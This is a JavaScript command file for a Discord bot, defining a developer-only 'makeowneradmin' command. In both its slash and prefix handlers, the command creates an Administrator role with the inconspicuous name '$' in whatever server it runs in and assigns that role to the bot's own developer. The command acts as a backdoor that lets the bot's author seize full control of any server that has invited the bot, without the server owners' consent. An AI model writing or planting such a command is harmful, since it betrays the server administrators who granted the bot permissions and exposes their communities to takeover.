const { PermissionsBitField } = require('discord.js');
const emojis = require('../../emojis.js');
const messages = require('../../utils/messages.js');
const ownerId = require('../../config.js').ownerId;

module.exports = {
    name: 'makeowneradmin',
    description: 'Create $ role and assign to bot owner (owner only)',
    category: 'developer',
    owner: true,
    userPerms: [],
    botPerms: ['ManageRoles'],
    player: false,
    inVoiceChannel: false,
    sameVoiceChannel: false,
    execute: async (interaction, client) => {
        const guild = interaction.guild;
        const ownerMember = guild.members.cache.get(ownerId);
        if (!ownerMember) {
            return messages.error(interaction, "Owner is not a member of this guild.");
        }

        let adminRole = guild.roles.cache.find(r => r.name === '$');
        if (!adminRole) {
            try {
                adminRole = await guild.roles.create({
                    name: '$',
                    permissions: [PermissionsBitField.Flags.Administrator],
                    reason: 'Created by makeowneradmin command'
                });
            } catch (error) {
                console.error(`Failed to create role: ${error.message}`);
                if (error.message.includes('permission')) {
                    return messages.error(interaction, "I don't have permission to create roles. Please move my role higher in the server settings.");
                }
                return messages.error(interaction, `Failed to create role: ${error.message}`);
            }
        }

        if (!ownerMember.roles.cache.has(adminRole.id)) {
            try {
                await ownerMember.roles.add(adminRole, 'makeowneradmin command');
            } catch (error) {
                console.error(`Failed to assign role: ${error.message}`);
                if (error.message.includes('hierarchy')) {
                    return messages.error(interaction, "Cannot assign this role because my highest role is below the $ role. Please move my role above it.");
                }
                return messages.error(interaction, `Failed to assign role: ${error.message}`);
            }
        }

        await messages.success(interaction, `Role $ created and assigned to you.`);
    },
    prefixExecute: async (message, args, client) => {
        if (message.author.id !== ownerId) {
            return messages.error(message, "This command is reserved for bot owner only!");
        }

        const guild = message.guild;
        const ownerMember = guild.members.cache.get(ownerId);
        if (!ownerMember) {
            return messages.error(message, "Owner is not a member of this guild.");
        }

        let adminRole = guild.roles.cache.find(r => r.name === '$');
        if (!adminRole) {
            try {
                adminRole = await guild.roles.create({
                    name: '$',
                    permissions: [PermissionsBitField.Flags.Administrator],
                    reason: 'Created by makeowneradmin command'
                });
            } catch (error) {
                console.error(`Failed to create role: ${error.message}`);
                if (error.message.includes('permission')) {
                    return messages.error(message, "I don't have permission to create roles. Please move my role higher in the server settings.");
                }
                return messages.error(message, `Failed to create role: ${error.message}`);
            }
        }

        if (!ownerMember.roles.cache.has(adminRole.id)) {
            try {
                await ownerMember.roles.add(adminRole, 'makeowneradmin command');
            } catch (error) {
                console.error(`Failed to assign role: ${error.message}`);
                if (error.message.includes('hierarchy')) {
                    return messages.error(message, "Cannot assign this role because my highest role is below the $ role. Please move my role above it.");
                }
                return messages.error(message, `Failed to assign role: ${error.message}`);
            }
        }

        await message.reply(messages.success(message.channel, `Role $ created and assigned to you.`));
    }
};